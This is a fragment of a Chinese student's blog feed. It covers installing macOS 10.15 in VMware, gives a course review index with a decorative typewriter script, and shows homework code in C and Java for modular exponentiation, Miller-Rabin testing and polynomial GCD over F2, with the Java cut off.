win-install.cmd，等待命令执行完毕，解锁 VMware Workstation Pro 安装 MacOS的功能。</p><h2 id="3-新建虚拟机："><a href="#3-新建虚拟机：" class="headerlink" title="3 新建虚拟机："></a>3 新建虚拟机：</h2><p>本文以典型为例</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122124653035.png" alt="image-20210122124653035" loading="lazy"></p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122124756348.png" alt="image-20210122124756348" loading="lazy"></p><p>选择10.15</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122124826085.png" alt="image-20210122124826085" loading="lazy"></p><p>再选择放虚拟机的位置</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122124853188.png" alt="image-20210122124853188" loading="lazy"></p><p>这里选择硬盘大小，如果只是看看玩玩，40就够了，想用的建议大点，系统装完之后大概占用20G左右空间</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122124913372.png" alt="image-20210122124913372" loading="lazy"></p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122125012741.png" alt="image-20210122125012741" loading="lazy"></p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122125050551.png" alt="image-20210122125050551" loading="lazy"></p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122125121826.png" alt="image-20210122125121826" loading="lazy"></p><p>这里全勾了</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122125148734.png" alt="image-20210122125148734" loading="lazy"></p><p>打开虚拟机目录编辑vmx文件，记事本就可以打开，在smc.present = “TRUE”下面一行添加smc.version = “0”</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122125537308.png" alt="image-20210122125537308" loading="lazy"></p><p>然后打开虚拟机</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122125301662.png" alt="image-20210122125301662" loading="lazy"></p><h2 id="4-安装MacOS"><a href="#4-安装MacOS" class="headerlink" title="4 安装MacOS:"></a>4 安装MacOS:</h2><p>选择语言</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122130201051.png" alt="image-20210122130201051" loading="lazy"></p><p>选择磁盘工具格式化磁盘</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122130246531.png" alt="image-20210122130246531" loading="lazy"></p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122130404576.png" alt="image-20210122130404576" loading="lazy"></p><p>然后返回选择安装，点继续，同意，然后等待安装完成</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122130457887.png" alt="image-20210122130457887" loading="lazy"></p><p>选择地区，然后一路继续</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122133101211.png" alt="image-20210122133101211" loading="lazy"></p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122133654266.png" alt="image-20210122133654266" loading="lazy"><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122133654903.png" alt="image-20210122133654903" loading="lazy"></p><h2 id="5-安装VMware-Tools："><a href="#5-安装VMware-Tools：" class="headerlink" title="5 安装VMware Tools："></a>5 安装VMware Tools：</h2><p>正常情况下，在第2步，安装 unlocker 时，会自动下载 darwin.iso，并复制到 VMware Tools 的根目录，但是由于官方源的失效，需要我们手动安装。先关闭MacOS，编辑虚拟机设置，在CDROM里，挂载 darwin.iso</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122133816635.png" alt="image-20210122133816635" loading="lazy"></p><p>然后再次启动MacOS，可以在桌面看到 VMware Tools 的盘符，双击，安装 VMware Tools 后即可</p><p>注意，这里要选择信任（先点击左下角的图标解锁），允许 系统 安装 VMware Tools。</p><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/image-20210122134232974.png" alt="image-20210122134232974" loading="lazy"></p><p>安装成功后，会自动重启电脑，你就可以看到熟悉的MacOS系统，赶紧全屏，体验一下新系统操作的感觉吧！</p>]]></content>
      
      
      <categories>
          
          <category> vm装mac10.15 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
            <tag> 好东西 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复习</title>
      <link href="2020/12/26/%E5%A4%8D%E4%B9%A0/"/>
      <url>2020/12/26/%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>期末复习大二上（更新完），大二下（在更了，在更了），笑死，根本不会。</p><p><img src="/2020/12/26/%E5%A4%8D%E4%B9%A0/image-20210106101517939.png" alt="image-20210106101517939" loading="lazy"></p><a id="more"></a><h1 id="大二上"><a href="#大二上" class="headerlink" title="大二上"></a>大二上</h1><p><a href="/2021/04/17/模电/">模电</a><br><a href="/2021/04/17/汇编/">汇编</a><br><a href="/2021/04/17/信安数学/">信安数学</a><br><a href="/2021/04/17/离散数学/">离散数学</a><br><a href="/2021/04/17/数据结构/">数据结构</a><br><a href="/2021/04/17/JAVA/">JAVA</a><br><a href="/2021/04/17/数据库/">数据库</a></p><h1 id="大二下"><a href="#大二下" class="headerlink" title="大二下"></a>大二下</h1><div id="binft"></div><script>//<a href="/2021/04/19/计算机组成原理/">计算机组成原理</a>//<a href="/2021/04/19/密码学/">密码学</a><p>//<a href="/2021/04/19/PHP/">PHP</a><br>//<a href="/2021/04/19/病毒原理/">病毒原理</a><br>//<a href="/2021/04/19/网络攻击与防御/">网络攻击与防御</a><br>var binft = function (r) {<br> function t() {<br>   return b[Math.floor(Math.random() * b.length)]<br> }<br> function e() {<br>   return String.fromCharCode(94 * Math.random() + 33)<br> }<br> function n(r) {<br>   for (var n = document.createDocumentFragment(), i = 0; r &gt; i; i++) {<br>     var l = document.createElement(“span”);<br>     l.textContent = e(), l.style.color = t(), n.appendChild(l)<br>   }<br>   return n<br> }<br> function i() {<br>   var t = o[c.skillI];<br>   c.step ? c.step– : (c.step = g, c.prefixP &lt; l.length ? (c.prefixP &gt;= 0 &amp;&amp; (c.text += l[c.prefixP]), c.prefixP++) : “forward” === c.direction ? c.skillP &lt; t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay– : (c.direction = “backward”, c.delay = a) : c.skillP &gt; 0 ? (c.text = c.text.slice(0, -1), c.skillP–) : (c.skillI = (c.skillI + 1) % o.length, c.direction = “forward”)), r.textContent = c.text, r.appendChild(n(c.prefixP &lt; l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)<br> }<br> var l = “”,<br> o = [“青青陵上柏，磊磊涧中石。”, “人生天地间，忽如远行客。”,”斗酒相娱乐，聊厚不为薄。”, “驱车策驽马，游戏宛与洛。”,”洛中何郁郁，冠带自相索。”,”长衢罗夹巷，王侯多第宅。”,”两宫遥相望，双阙百余尺。”,”极宴娱心意，戚戚何所迫？”].map(function (r) {<br> return r + “”<br> }),<br> a = 2,<br> g = 1,<br> s = 5,<br> d = 75,<br> b = [“rgb(110,64,170)”, “rgb(150,61,179)”, “rgb(191,60,175)”, “rgb(228,65,157)”, “rgb(254,75,131)”, “rgb(255,94,99)”, “rgb(255,120,71)”, “rgb(251,150,51)”, “rgb(226,183,47)”, “rgb(198,214,60)”, “rgb(175,240,91)”, “rgb(127,246,88)”, “rgb(82,246,103)”, “rgb(48,239,130)”, “rgb(29,223,163)”, “rgb(26,199,194)”, “rgb(35,171,216)”, “rgb(54,140,225)”, “rgb(76,110,219)”, “rgb(96,84,200)”],<br> c = {<br>   text: “”,<br>   prefixP: -s,<br>   skillI: 0,<br>   skillP: 0,<br>   direction: “forward”,<br>   delay: a,<br>   step: g<br> };<br> i()<br> };<br> binft(document.getElementById(‘binft’));<br></script><p></p><p><a href="/2021/04/19/PHP/">PHP</a></p><p><a href="/2021/04/19/概率论/">概率论</a></p><p><a href="/2021/04/19/数电/">数电</a></p><p><a href="/2021/04/19/计算机网络/">计算机网络</a></p><p>//<a href="/2021/04/19/马原/">马原</a></p>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信安数学基础C语言代码</title>
      <link href="2020/12/03/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81/"/>
      <url>2020/12/03/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>信安数学部分使用代码解决的作业</p><a id="more"></a><h2 id="模重复平方计算法"><a href="#模重复平方计算法" class="headerlink" title="模重复平方计算法"></a>模重复平方计算法</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;math.h&gt; int main()&#123;int s&#x3D;1,k,b&#x3D;7,m&#x3D;113,t;int num,n, c, i &#x3D; 0;    int a[32];    printf(&quot;输入学号：&quot;);    scanf(&quot;%d&quot;, &amp;num);    n &#x3D; num;    while (num&gt;0)    &#123;        c &#x3D; (num % 2);        a[i] &#x3D; c;        num &#x3D; num &#x2F; 2;        i++;    &#125;    k&#x3D;i;    printf(&quot;学号%d转换成二进制数是：&quot;, n);    for (i--; i &gt;&#x3D; 0; i--)                   printf(&quot;%d&quot;, a[i]);    printf(&quot;\n&quot;);for(i&#x3D;0;i&lt;k;i++)&#123;if(a[i]&#x3D;&#x3D;1)&#123;s&#x3D;(s*b)%m;&#125;t&#x3D;pow(2,i);printf(&quot;7^%d &#x3D; %d (mod %d)\n&quot;,t,b,m);b&#x3D;(b*b)%m;&#125;printf(&quot;\n7^%d &#x3D; %d (mod %d)\n&quot;,n,s,m);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Miller-Rabin素性检测算法"><a href="#Miller-Rabin素性检测算法" class="headerlink" title="Miller -Rabin素性检测算法"></a>Miller -Rabin素性检测算法</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">int</span> <span class="token function">getmod</span><span class="token punctuation">(</span><span class="token keyword">int</span> b<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//模重复平方</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>sign<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>num<span class="token punctuation">;</span><span class="token keyword">int</span> s<span class="token punctuation">,</span>t<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>h<span class="token punctuation">,</span>h1<span class="token punctuation">;</span><span class="token keyword">int</span> b<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"...........\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输入要检验的数："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"求模使用的第一题的模重复平方计算法\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d是合数"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>num<span class="token operator">=</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>num<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sign<span class="token operator">++</span><span class="token punctuation">;</span>num<span class="token operator">=</span>num<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>s<span class="token operator">=</span>sign<span class="token punctuation">;</span>t<span class="token operator">=</span>num<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"s=%d,t=%d\n"</span><span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token function">sqrt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>h<span class="token operator">=</span><span class="token function">getmod</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>t<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n当b=%d，"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>s<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>h1<span class="token operator">=</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token function">getmod</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span>h1<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b^%d^%d=%d，"</span><span class="token punctuation">,</span>t<span class="token punctuation">,</span>j<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> b <span class="token operator">==</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"是素数\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>s<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>b<span class="token operator">!=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"是合数\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token operator">==</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"是素数\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"结论：%d是素数\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">getmod</span><span class="token punctuation">(</span><span class="token keyword">int</span> b<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> s<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>k<span class="token punctuation">,</span>t<span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> c<span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>num<span class="token operator">=</span>n<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>num<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>c <span class="token operator">=</span> <span class="token punctuation">(</span>num <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>num <span class="token operator">=</span> num <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>k<span class="token operator">=</span>i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>k<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token operator">%</span>m<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>t<span class="token operator">=</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token punctuation">(</span>b<span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token operator">%</span>m<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span>  <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> ax <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> bx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> rx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>        <span class="token comment">//输入的数字转换成字符数组</span>        <span class="token class-name">Scanner</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入域(输入2表示域F2[X]):"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入ax(101011表示X^5+X^3+X+1):"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arraya <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//转成数字数组</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>a<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            ax<span class="token punctuation">.</span><span class="token function">addElement</span><span class="token punctuation">(</span>arraya<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入bx(1111表示X^3+X^2+X+1)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        b <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayb <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>b<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            bx<span class="token punctuation">.</span><span class="token function">addElement</span><span class="token punctuation">(</span>arrayb<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//输出ax，bx代表的多项式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"ax = "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Invert</span><span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"bx = "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Invert</span><span class="token punctuation">(</span>bx<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Euclidean</span><span class="token punctuation">(</span>ax<span class="token punctuation">,</span>bx<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Euclidean</span><span class="token punctuation">(</span><span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> ax<span class="token punctuation">,</span><span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> bx<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> al <span class="token operator">=</span> ax<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bl <span class="token operator">=</span> bx<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> cx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> tx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>count<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token class-name">Invert</span><span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" = "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>al<span class="token operator">-</span>bl<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> cx0<span class="token operator">=</span><span class="token punctuation">(</span>ax<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token 